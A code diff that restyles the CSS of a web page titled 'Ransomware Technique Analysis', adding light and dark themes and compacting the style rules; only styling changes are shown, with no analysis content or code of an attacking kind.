@@ -1,381 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Ransomware Technique Analysis – Domenico</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #0a0c0f;
-    --bg2: #0d1117;
-    --bg3: #161b22;
-    --border: #21262d;
-    --border-accent: #30363d;
-    --green: #39d353;
-    --green-dim: #1a6b2a;
-    --red: #f85149;
-    --yellow: #e3b341;
-    --blue: #58a6ff;
-    --cyan: #79c0ff;
-    --purple: #bc8cff;
-    --text: #c9d1d9;
-    --text-dim: #8b949e;
-    --text-bright: #f0f6fc;
-    --font-mono: 'Share Tech Mono', monospace;
-    --font-ui: 'Rajdhani', sans-serif;
-  }
-
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--font-ui);
-    font-size: 16px;
-    line-height: 1.6;
-    min-height: 100vh;
-  }
-
-  body::before {
-    content: '';
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
-    pointer-events: none;
-    z-index: 9999;
-  }
-
-  /* NAV */
-  nav {
-    background: var(--bg2);
-    border-bottom: 1px solid var(--border);
-    padding: 0 2rem;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    height: 56px;
-    position: sticky;
-    top: 0;
-    z-index: 100;
-  }
-  .nav-brand { font-family: var(--font-mono); color: var(--green); font-size: 0.85rem; letter-spacing: 0.05em; }
-  .nav-links { display: flex; gap: 0; list-style: none; }
-  .nav-links a {
-    color: var(--text-dim); text-decoration: none; font-family: var(--font-ui); font-weight: 600;
-    font-size: 0.8rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0 1.2rem;
-    height: 56px; display: flex; align-items: center; border-bottom: 2px solid transparent; transition: all 0.2s;
-  }
-  .nav-links a:hover, .nav-links a.active { color: var(--text-bright); border-bottom-color: var(--green); }
-
-  /* LAYOUT */
-  .container { max-width: 960px; margin: 0 auto; padding: 2.5rem 2rem; }
-
-  .page-header { margin-bottom: 2.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border); }
-  .breadcrumb { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-dim); margin-bottom: 1rem; }
-  .breadcrumb a { color: var(--green); text-decoration: none; }
-  .breadcrumb span { margin: 0 0.4rem; }
-  .page-title {
-    font-size: 1.8rem; font-weight: 700; color: var(--text-bright); letter-spacing: 0.02em;
-    text-transform: uppercase; display: flex; align-items: center; gap: 0.75rem;
-  }
-  .page-title::before { content: '//'; color: var(--green); font-family: var(--font-mono); font-size: 1.2rem; }
-  .page-subtitle { margin-top: 0.5rem; color: var(--text-dim); font-size: 0.95rem; font-weight: 500; }
-
-  .section { margin-bottom: 2.5rem; }
-  .section-title {
-    font-family: var(--font-ui); font-weight: 700; font-size: 0.75rem; letter-spacing: 0.15em;
-    text-transform: uppercase; color: var(--green); margin-bottom: 1.25rem;
-    display: flex; align-items: center; gap: 0.5rem;
-  }
-  .section-title::before { content: ''; display: inline-block; width: 3px; height: 14px; background: var(--green); border-radius: 2px; }
-
-  .card { background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 1rem; }
-
-  /* ATTACK CHAIN TIMELINE */
-  .chain {
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-  }
-
-  .chain-phase {
-    border-bottom: 1px solid var(--border);
-    overflow: hidden;
-    transition: background 0.2s;
-  }
-
-  .chain-phase:last-child { border-bottom: none; }
-
-  .chain-phase-header {
-    display: flex;
-    align-items: center;
-    gap: 1rem;
-    padding: 1rem 1.5rem;
-    cursor: pointer;
-    user-select: none;
-    transition: background 0.15s;
-  }
-
-  .chain-phase-header:hover { background: rgba(255,255,255,0.02); }
-
-  .phase-badge {
-    font-family: var(--font-mono);
-    font-size: 0.65rem;
-    padding: 0.2rem 0.55rem;
-    border-radius: 3px;
-    font-weight: 600;
-    letter-spacing: 0.05em;
-    text-transform: uppercase;
-    white-space: nowrap;
-    flex-shrink: 0;
-  }
-
-  .badge-initial   { background: rgba(248,81,73,0.12);   color: var(--red);    border: 1px solid rgba(248,81,73,0.3); }
-  .badge-exec      { background: rgba(227,179,65,0.12);  color: var(--yellow); border: 1px solid rgba(227,179,65,0.3); }
-  .badge-cred      { background: rgba(188,140,255,0.12); color: var(--purple); border: 1px solid rgba(188,140,255,0.3); }
-  .badge-lateral   { background: rgba(88,166,255,0.1);   color: var(--blue);   border: 1px solid rgba(88,166,255,0.25); }
-  .badge-impact    { background: rgba(248,81,73,0.18);   color: var(--red);    border: 1px solid rgba(248,81,73,0.4); }
-
-  .phase-title { font-weight: 700; font-size: 0.95rem; color: var(--text-bright); flex: 1; }
-
-  .phase-mitre {
-    font-family: var(--font-mono);
-    font-size: 0.7rem;
-    color: var(--text-dim);
-  }
-
-  .phase-chevron {
-    font-family: var(--font-mono);
-    font-size: 0.8rem;
-    color: var(--text-dim);
-    transition: transform 0.25s;
-    margin-left: 0.5rem;
-  }
-
-  .chain-phase.open .phase-chevron { transform: rotate(90deg); }
-
-  .chain-phase-body {
-    display: none;
-    padding: 0 1.5rem 1.25rem;
-    border-top: 1px solid var(--border);
-    background: rgba(0,0,0,0.2);
-  }
-
-  .chain-phase.open .chain-phase-body { display: block; }
-
-  .phase-detail { font-size: 0.9rem; color: var(--text); line-height: 1.7; margin-bottom: 0.75rem; margin-top: 0.85rem; }
-
-  .telemetry-block {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-left: 3px solid var(--green);
-    border-radius: 0 4px 4px 0;
-    padding: 0.75rem 1rem;
-    font-family: var(--font-mono);
-    font-size: 0.78rem;
-    color: var(--cyan);
-    line-height: 1.7;
-    margin-top: 0.6rem;
-    white-space: pre-wrap;
-    word-break: break-word;
-  }
-
-  .telemetry-label {
-    font-family: var(--font-mono);
-    font-size: 0.68rem;
-    color: var(--green);
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    margin-bottom: 0.35rem;
-  }
-
-  /* DETECTION TABLE */
-  .detect-table {
-    width: 100%;
-    border-collapse: collapse;
-    font-size: 0.875rem;
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-  }
-
-  .detect-table thead tr {
-    background: var(--bg3);
-    border-bottom: 1px solid var(--border);
-  }
-
-  .detect-table th {
-    font-family: var(--font-mono);
-    font-size: 0.68rem;
-    color: var(--green);
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    padding: 0.75rem 1rem;
-    text-align: left;
-    font-weight: 600;
-  }
-
-  .detect-table td {
-    padding: 0.75rem 1rem;
-    border-bottom: 1px solid var(--border);
-    color: var(--text-dim);
-    vertical-align: top;
-    line-height: 1.5;
-  }
-
-  .detect-table tr:last-child td { border-bottom: none; }
-  .detect-table tr:hover td { background: rgba(255,255,255,0.015); }
-
-  .detect-table td:first-child { font-family: var(--font-mono); font-size: 0.78rem; color: var(--cyan); white-space: nowrap; }
-  .detect-table td:nth-child(2) { color: var(--text); font-weight: 500; }
-
-  /* WEAKNESS LIST */
-  .weakness-list {
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-  }
-
-  .weakness-item {
-    display: flex;
-    align-items: flex-start;
-    gap: 1rem;
-    padding: 0.9rem 1.5rem;
-    border-bottom: 1px solid var(--border);
-    font-size: 0.9rem;
-  }
-
-  .weakness-item:last-child { border-bottom: none; }
-
-  .weakness-icon {
-    font-family: var(--font-mono);
-    font-size: 0.75rem;
-    color: var(--red);
-    flex-shrink: 0;
-    margin-top: 0.1rem;
-  }
-
-  /* STRATEGIC VALUE */
-  .value-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-    gap: 1px;
-    background: var(--border);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-  }
-
-  .value-card {
-    background: var(--bg2);
-    padding: 1.25rem 1.5rem;
-  }
-
-  .value-card-label {
-    font-family: var(--font-mono);
-    font-size: 0.68rem;
-    color: var(--green);
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    margin-bottom: 0.4rem;
-  }
-
-  .value-card-text {
-    font-size: 0.88rem;
-    color: var(--text-dim);
-    line-height: 1.5;
-  }
-
-  /* NAV LINK */
-  .page-nav-link {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    color: var(--green);
-    text-decoration: none;
-    font-weight: 600;
-    font-size: 0.85rem;
-    border: 1px solid var(--green-dim);
-    border-radius: 4px;
-    padding: 0.55rem 1.1rem;
-    background: rgba(57,211,83,0.05);
-    transition: all 0.2s;
-    margin-top: 0.5rem;
-    font-family: var(--font-ui);
-    letter-spacing: 0.05em;
-  }
-
-  .page-nav-link:hover { background: rgba(57,211,83,0.12); border-color: var(--green); }
-  .page-nav-link::after { content: '→'; font-family: var(--font-mono); }
-
-  /* BINARY DECORATION */
-  .binary-strip {
-    font-family: var(--font-mono);
-    font-size: 0.65rem;
-    color: var(--border-accent);
-    letter-spacing: 0.15em;
-    line-height: 1.6;
-    padding: 1rem 1.5rem;
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-    white-space: nowrap;
-    text-overflow: ellipsis;
-    user-select: none;
-  }
-
-  @media (max-width: 600px) {
-    .container { padding: 1.5rem 1rem; }
-    .nav-links a { padding: 0 0.6rem; font-size: 0.72rem; }
-    .detect-table { font-size: 0.8rem; }
-    .detect-table th, .detect-table td { padding: 0.6rem 0.75rem; }
-  }
-
-  #binary-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:0.25;}
+  [data-theme="dark"]{--bg:#0a0c0f;--bg2:#0d1117;--bg3:#161b22;--border:#21262d;--border-accent:#30363d;--green:#39d353;--green-dim:#1a6b2a;--green-glow:rgba(57,211,83,0.12);--red:#f85149;--yellow:#e3b341;--blue:#58a6ff;--cyan:#79c0ff;--purple:#bc8cff;--text:#c9d1d9;--text-dim:#8b949e;--text-bright:#f0f6fc;--nav-bg:rgba(13,17,23,0.88);--scanline:rgba(0,0,0,0.04);--rain-opacity:0.25;--hover-row:rgba(255,255,255,0.015);}
+  [data-theme="light"]{--bg:#f0f4f0;--bg2:#ffffff;--bg3:#e6ece6;--border:#d0dbd0;--border-accent:#b8ccb8;--green:#1a7a2e;--green-dim:#c8e6c9;--green-glow:rgba(26,122,46,0.10);--red:#b02020;--yellow:#9a6008;--blue:#1a5fa0;--cyan:#1a7a8a;--purple:#6a3ab0;--text:#0e1f0e;--text-dim:#3d6640;--text-bright:#0a140a;--nav-bg:rgba(240,244,240,0.88);--scanline:rgba(0,80,0,0.015);--rain-opacity:0.12;--hover-row:rgba(0,0,0,0.02);}
+  :root{--font-mono:'Share Tech Mono',monospace;--font-ui:'Rajdhani',sans-serif;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:var(--font-ui);font-size:16px;line-height:1.6;min-height:100vh;transition:background 0.25s,color 0.25s;}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,var(--scanline) 2px,var(--scanline) 4px);pointer-events:none;z-index:9999;}
+  #matrix-rain{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:var(--rain-opacity);}
   nav,.container{position:relative;z-index:1;}
-  nav{background:rgba(13,17,23,0.9)!important;backdrop-filter:blur(10px);}
-  .nav-brand{text-shadow:0 0 12px rgba(57,211,83,0.5)!important;}
-  .nav-links a:hover,.nav-links a.active{text-shadow:0 0 8px rgba(57,211,83,0.4)!important;}
-  .page-title::before{text-shadow:0 0 10px rgba(57,211,83,0.6);animation:glitch 5s infinite;}
-  @keyframes glitch{0%,88%,100%{transform:translate(0);text-shadow:0 0 10px rgba(57,211,83,0.6);}89%{transform:translate(-2px,1px);text-shadow:2px 0 #79c0ff;}90%{transform:translate(2px,-1px);text-shadow:-2px 0 #f85149;}91%{transform:translate(0);}93%{transform:translate(1px,1px);text-shadow:-1px 0 #79c0ff;}94%{transform:translate(0);}}
-  .section-title{overflow:hidden;position:relative;}
-  .section-title::before{box-shadow:0 0 6px var(--green);animation:barPulse 2.5s ease-in-out infinite;}
-  .section-title::after{content:"";position:absolute;top:0;left:-60%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(57,211,83,0.07),transparent);animation:sweep 4s ease-in-out infinite;}
-  @keyframes barPulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--green)}50%{opacity:0.4;box-shadow:none}}
+  nav{background:var(--nav-bg);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:56px;position:sticky;top:0;z-index:100;transition:background 0.25s,border-color 0.25s;}
+  .nav-brand{font-family:var(--font-mono);color:var(--green);font-size:0.85rem;letter-spacing:0.05em;text-decoration:none;}
+  .nav-links{display:flex;list-style:none;align-items:center;}
+  .nav-links a{color:var(--text-dim);text-decoration:none;font-family:var(--font-ui);font-weight:600;font-size:0.8rem;letter-spacing:0.1em;text-transform:uppercase;padding:0 1.2rem;height:56px;display:flex;align-items:center;border-bottom:2px solid transparent;transition:all 0.2s;}
+  .nav-links a:hover,.nav-links a.active{color:var(--text-bright);border-bottom-color:var(--green);}
+  .theme-toggle-btn{font-family:var(--font-mono);font-size:0.72rem;color:var(--text-dim);background:var(--green-glow);border:1px solid var(--border-accent);border-radius:4px;padding:0.3rem 0.75rem;cursor:pointer;letter-spacing:0.08em;margin-left:1rem;transition:color 0.2s,border-color 0.2s;}
+  .theme-toggle-btn:hover{color:var(--green);border-color:var(--green);}
+  .container{max-width:960px;margin:0 auto;padding:2.5rem 2rem;}
+  .page-header{margin-bottom:2.5rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border);}
+  .breadcrumb{font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);margin-bottom:1rem;}
+  .breadcrumb a{color:var(--green);text-decoration:none;}
+  .breadcrumb span{margin:0 0.4rem;}
+  .page-title{font-size:1.8rem;font-weight:700;color:var(--text-bright);letter-spacing:0.02em;text-transform:uppercase;display:flex;align-items:center;gap:0.75rem;}
+  .page-title::before{content:'//';color:var(--green);font-family:var(--font-mono);font-size:1.2rem;animation:glitch 5s infinite;}
+  @keyframes glitch{0%,88%,100%{transform:translate(0)}89%{transform:translate(-2px,1px)}90%{transform:translate(2px,-1px)}91%,94%{transform:translate(0)}93%{transform:translate(1px,1px)}}
+  .page-subtitle{margin-top:0.5rem;color:var(--text-dim);font-size:0.95rem;font-weight:500;}
+  .section{margin-bottom:2.5rem;}
+  .section-title{font-family:var(--font-ui);font-weight:700;font-size:0.75rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--green);margin-bottom:1.25rem;display:flex;align-items:center;gap:0.5rem;position:relative;overflow:hidden;}
+  .section-title::before{content:'';display:inline-block;width:3px;height:14px;background:var(--green);border-radius:2px;animation:barPulse 2.5s ease-in-out infinite;}
+  .section-title::after{content:'';position:absolute;top:0;left:-60%;width:60%;height:100%;background:linear-gradient(90deg,transparent,var(--green-glow),transparent);animation:sweep 4s ease-in-out infinite;}
+  @keyframes barPulse{0%,100%{opacity:1}50%{opacity:0.4}}
   @keyframes sweep{0%{left:-60%}50%{left:160%}100%{left:160%}}
-  .page-nav-link,.project-link,.return-link{box-shadow:0 0 10px rgba(57,211,83,0.08);}
-  .page-nav-link:hover,.project-link:hover,.return-link:hover{box-shadow:0 0 18px rgba(57,211,83,0.2);}
-  .stat-value,.cstat-val{text-shadow:0 0 12px rgba(57,211,83,0.5);}
-  .task-num,.step-badge,.step-num{text-shadow:0 0 4px rgba(57,211,83,0.3);}
-  .feedback-correct{text-shadow:0 0 6px rgba(57,211,83,0.5);}
-  .execute-btn:hover:not(:disabled){box-shadow:0 0 10px rgba(57,211,83,0.15);}
-  .boot-line .ok{text-shadow:0 0 4px rgba(57,211,83,0.3);}
-  .detect-table td:first-child{text-shadow:0 0 4px rgba(121,192,255,0.3);}
-
-  /* ── ANALYSIS ROOM ─────────────────────────────────────────────────────── */
-  .room-terminal{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;box-shadow:0 0 20px rgba(57,211,83,0.04);}
-  .room-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.1);display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap;}
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin-bottom:1rem;}
+  .binary-strip{font-family:var(--font-mono);font-size:0.65rem;color:var(--border-accent);letter-spacing:0.15em;line-height:1.6;padding:1rem 1.5rem;background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;user-select:none;}
+  .chain{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+  .chain-phase{border-bottom:1px solid var(--border);overflow:hidden;transition:background 0.2s;}
+  .chain-phase:last-child{border-bottom:none;}
+  .chain-phase-header{display:flex;align-items:center;gap:1rem;padding:1rem 1.5rem;cursor:pointer;user-select:none;transition:background 0.15s;}
+  .chain-phase-header:hover{background:var(--hover-row);}
+  .phase-badge{font-family:var(--font-mono);font-size:0.65rem;padding:0.2rem 0.55rem;border-radius:3px;font-weight:600;letter-spacing:0.05em;text-transform:uppercase;white-space:nowrap;flex-shrink:0;}
+  .badge-initial{background:rgba(248,81,73,0.12);color:var(--red);border:1px solid rgba(248,81,73,0.3);}
+  .badge-exec{background:rgba(227,179,65,0.12);color:var(--yellow);border:1px solid rgba(227,179,65,0.3);}
+  .badge-cred{background:rgba(188,140,255,0.12);color:var(--purple);border:1px solid rgba(188,140,255,0.3);}
+  .badge-lateral{background:rgba(88,166,255,0.1);color:var(--blue);border:1px solid rgba(88,166,255,0.25);}
+  .badge-impact{background:rgba(248,81,73,0.18);color:var(--red);border:1px solid rgba(248,81,73,0.4);}
+  .phase-title{font-weight:700;font-size:0.95rem;color:var(--text-bright);flex:1;}
+  .phase-mitre{font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim);}
+  .phase-chevron{font-family:var(--font-mono);font-size:0.8rem;color:var(--text-dim);transition:transform 0.25s;margin-left:0.5rem;}
+  .chain-phase.open .phase-chevron{transform:rotate(90deg);}
+  .chain-phase-body{display:none;padding:0 1.5rem 1.25rem;border-top:1px solid var(--border);background:var(--hover-row);}
+  .chain-phase.open .chain-phase-body{display:block;}
+  .phase-detail{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.75rem;margin-top:0.85rem;}
+  .telemetry-block{background:var(--bg);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:0 4px 4px 0;padding:0.75rem 1rem;font-family:var(--font-mono);font-size:0.78rem;color:var(--cyan);line-height:1.7;margin-top:0.6rem;white-space:pre-wrap;word-break:break-word;}
+  .telemetry-label{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:0.35rem;}
+  .page-nav-link{display:inline-flex;align-items:center;gap:0.5rem;color:var(--green);text-decoration:none;font-weight:600;font-size:0.85rem;border:1px solid var(--green-dim);border-radius:4px;padding:0.55rem 1.1rem;background:var(--green-glow);transition:all 0.2s;margin-top:0.5rem;font-family:var(--font-ui);letter-spacing:0.05em;}
+  .page-nav-link:hover{background:rgba(57,211,83,0.18);border-color:var(--green);}
+  .page-nav-link::after{content:'→';font-family:var(--font-mono);}
+  .detect-table{width:100%;border-collapse:collapse;font-size:0.875rem;background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+  .detect-table thead tr{background:var(--bg3);border-bottom:1px solid var(--border);}
+  .detect-table th{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);text-transform:uppercase;letter-spacing:0.1em;padding:0.75rem 1rem;text-align:left;font-weight:600;}
+  .detect-table td{padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-dim);vertical-align:top;line-height:1.5;}
+  .detect-table tr:last-child td{border-bottom:none;}
+  .detect-table tr:hover td{background:var(--hover-row);}
+  .detect-table td:first-child{font-family:var(--font-mono);font-size:0.78rem;color:var(--cyan);white-space:nowrap;}
+  .detect-table td:nth-child(2){color:var(--text);font-weight:500;}
+  .weakness-list{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+  .weakness-item{display:flex;align-items:flex-start;gap:1rem;padding:0.9rem 1.5rem;border-bottom:1px solid var(--border);font-size:0.9rem;}
+  .weakness-item:last-child{border-bottom:none;}
+  .weakness-icon{font-family:var(--font-mono);font-size:0.75rem;color:var(--red);background:rgba(248,81,73,0.08);border:1px solid rgba(248,81,73,0.25);border-radius:3px;padding:0.15rem 0.4rem;white-space:nowrap;margin-top:0.1rem;flex-shrink:0;}
+  .value-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+  .value-card{background:var(--bg2);padding:1.25rem 1.5rem;}
+  .value-card-label{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.4rem;}
+  .value-card-text{font-size:0.88rem;color:var(--text-dim);line-height:1.5;}
+  /* ROOM */
+  .room-terminal{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+  .terminal-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:0.6rem 1rem;display:flex;align-items:center;gap:0.5rem;}
+  .dot{width:10px;height:10px;border-radius:50%;}
+  .dot-red{background:#ff5f57;}.dot-yellow{background:#febc2e;}.dot-green{background:#28c840;}
+  .terminal-title{font-family:var(--font-mono);font-size:0.72rem;color:var(--text-dim);margin-left:0.5rem;}
+  .room-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);background:var(--hover-row);display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap;}
   .room-meta{display:flex;flex-direction:column;gap:0.25rem;}
-  .room-name{font-family:var(--font-mono);font-size:0.75rem;color:var(--green);letter-spacing:0.08em;text-shadow:0 0 6px rgba(57,211,83,0.4);}
+  .room-name{font-family:var(--font-mono);font-size:0.75rem;color:var(--green);letter-spacing:0.08em;}
   .room-desc{font-size:0.85rem;color:var(--text-dim);}
   .room-progress-wrap{display:flex;flex-direction:column;align-items:flex-end;gap:0.35rem;min-width:140px;}
   .room-progress-label{font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim);}
   .room-progress-bar{width:140px;height:4px;background:var(--border);border-radius:2px;overflow:hidden;}
   .room-progress-fill{height:100%;background:var(--green);border-radius:2px;transition:width 0.6s cubic-bezier(0.4,0,0.2,1);width:0%;}
   .room-tier-badge{font-family:var(--font-mono);font-size:0.68rem;letter-spacing:0.12em;padding:0.2rem 0.6rem;border-radius:3px;font-weight:700;border:1px solid;display:inline-block;margin-bottom:0.3rem;transition:all 0.4s;}
-  .tier-novice{color:var(--green);border-color:var(--green-dim);background:rgba(57,211,83,0.08);}
+  .tier-novice{color:var(--green);border-color:var(--green-dim);background:var(--green-glow);}
   .tier-intermediate{color:var(--blue);border-color:rgba(88,166,255,0.3);background:rgba(88,166,255,0.08);}
   .tier-hard{color:var(--yellow);border-color:rgba(227,179,65,0.35);background:rgba(227,179,65,0.08);}
   .tier-expert{color:var(--red);border-color:rgba(248,81,73,0.4);background:rgba(248,81,73,0.1);}
   .room-tier-track{display:flex;gap:0.35rem;margin-top:0.35rem;}
   .tier-pip{width:22px;height:22px;border-radius:50%;border:1px solid var(--border-accent);font-family:var(--font-mono);font-size:0.6rem;display:flex;align-items:center;justify-content:center;color:var(--text-dim);transition:all 0.4s;}
-  .tier-pip.done{border-color:var(--green);color:var(--green);background:rgba(57,211,83,0.2);}
-  .tier-pip.active{border-color:var(--green);color:var(--green);background:rgba(57,211,83,0.1);}
+  .tier-pip.done{border-color:var(--green);color:var(--green);background:var(--green-glow);}
+  .tier-pip.active{border-color:var(--green);color:var(--green);background:var(--green-glow);}
   .tier-pip[data-tier="1"].active{border-color:var(--blue);color:var(--blue);background:rgba(88,166,255,0.1);}
   .tier-pip[data-tier="2"].active{border-color:var(--yellow);color:var(--yellow);background:rgba(227,179,65,0.1);}
   .tier-pip[data-tier="3"].active{border-color:var(--red);color:var(--red);background:rgba(248,81,73,0.1);}
@@ -383,18 +107,18 @@
   .task-card.locked{display:none;}
   .task-card.active{border-bottom:1px solid var(--border);}
   .task-card.active .task-card-inner{animation:slideIn 0.5s cubic-bezier(0.4,0,0.2,1);}
-  .task-card.completed{border-bottom:1px solid var(--border);background:rgba(57,211,83,0.025);}
-  .task-card.completed .task-card-inner{opacity:0.55;}
-  .task-card.completed .task-input-room{border-color:var(--green);background:rgba(57,211,83,0.05);color:var(--green);}
+  .task-card.completed{border-bottom:1px solid var(--border);background:var(--green-glow);}
+  .task-card.completed .task-card-inner{opacity:0.6;}
+  .task-card.completed .task-input-room{border-color:var(--green);color:var(--green);}
   .task-card.completed .exec-btn{display:none;}
   .task-card.completed .task-completed-badge{display:flex!important;}
   .task-lock-bar{display:none!important;}
   @keyframes slideIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
-  @keyframes unlockFlash{0%{background:rgba(57,211,83,0.1);box-shadow:inset 0 0 0 1px rgba(57,211,83,0.3)}100%{background:transparent;box-shadow:none}}
+  @keyframes unlockFlash{0%{background:var(--green-glow)}100%{background:transparent}}
   .task-card.unlocking{animation:unlockFlash 0.8s ease forwards;}
   .task-card-inner{padding:1.25rem 1.5rem;}
   .task-header{display:flex;align-items:center;gap:0.75rem;margin-bottom:1rem;}
-  .task-num-r{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);background:rgba(57,211,83,0.08);border:1px solid var(--green-dim);border-radius:3px;padding:0.2rem 0.55rem;white-space:nowrap;flex-shrink:0;}
+  .task-num-r{font-family:var(--font-mono);font-size:0.68rem;color:var(--green);background:var(--green-glow);border:1px solid var(--green-dim);border-radius:3px;padding:0.2rem 0.55rem;white-space:nowrap;flex-shrink:0;}
   .task-title-r{font-weight:700;font-size:0.95rem;color:var(--text-bright);}
   .task-completed-badge{display:none;align-items:center;gap:0.4rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--green);margin-left:auto;}
   .code-block-r{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:0.75rem 1rem;font-family:var(--font-mono);font-size:0.8rem;color:var(--cyan);margin-bottom:0.9rem;line-height:1.7;white-space:pre-wrap;word-break:break-word;}
@@ -402,15 +126,14 @@
   .task-prompt-r::before{content:'> ';font-family:var(--font-mono);color:var(--green);}
   .task-input-row-r{display:flex;gap:0.6rem;align-items:center;}
   .task-input-room{flex:1;background:var(--bg);border:1px solid var(--border-accent);border-radius:4px;padding:0.55rem 0.9rem;font-family:var(--font-mono);font-size:0.82rem;color:var(--text-bright);outline:none;transition:all 0.2s;}
-  .task-input-room:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(57,211,83,0.08);}
-  .task-input-room.wrong-r{border-color:var(--red);background:rgba(248,81,73,0.05);animation:shakeR 0.35s ease;}
-  @keyframes shakeR{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
-  .exec-btn{background:var(--bg3);border:1px solid var(--border-accent);color:var(--text);font-family:var(--font-mono);font-size:0.78rem;padding:0.55rem 1.1rem;border-radius:4px;cursor:pointer;transition:all 0.2s;white-space:nowrap;letter-spacing:0.03em;}
-  .exec-btn:hover:not(:disabled){background:rgba(57,211,83,0.1);border-color:var(--green);color:var(--green);}
+  .task-input-room:focus{border-color:var(--green);box-shadow:0 0 0 3px var(--green-glow);}
+  .task-input-room.wrong-r{border-color:var(--red);background:rgba(248,81,73,0.05);animation:shake 0.35s ease;}
+  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+  .exec-btn{background:var(--bg3);border:1px solid var(--border-accent);color:var(--text);font-family:var(--font-mono);font-size:0.78rem;padding:0.55rem 1.1rem;border-radius:4px;cursor:pointer;transition:all 0.2s;white-space:nowrap;}
+  .exec-btn:hover:not(:disabled){background:var(--green-glow);border-color:var(--green);color:var(--green);}
   .exec-btn:disabled{opacity:0.4;cursor:not-allowed;}
   .task-feedback-r{margin-top:0.6rem;font-family:var(--font-mono);font-size:0.78rem;min-height:1.2em;}
-  .fb-correct{color:var(--green);}
-  .fb-wrong{color:var(--red);}
+  .fb-correct{color:var(--green);}.fb-wrong{color:var(--red);}
   .hint-btn-r{background:none;border:1px solid var(--border-accent);color:var(--text-dim);font-family:var(--font-mono);font-size:0.68rem;padding:0.25rem 0.6rem;border-radius:3px;cursor:pointer;transition:all 0.2s;margin-top:0.5rem;}
   .hint-btn-r:hover{border-color:var(--yellow);color:var(--yellow);}
   .hint-text-r{font-family:var(--font-mono);font-size:0.75rem;color:var(--yellow);margin-top:0.5rem;display:none;padding:0.5rem 0.75rem;background:rgba(227,179,65,0.06);border:1px solid rgba(227,179,65,0.2);border-radius:4px;line-height:1.5;}
@@ -420,104 +143,92 @@
   #completion-canvas-r{position:absolute;inset:0;pointer-events:none;}
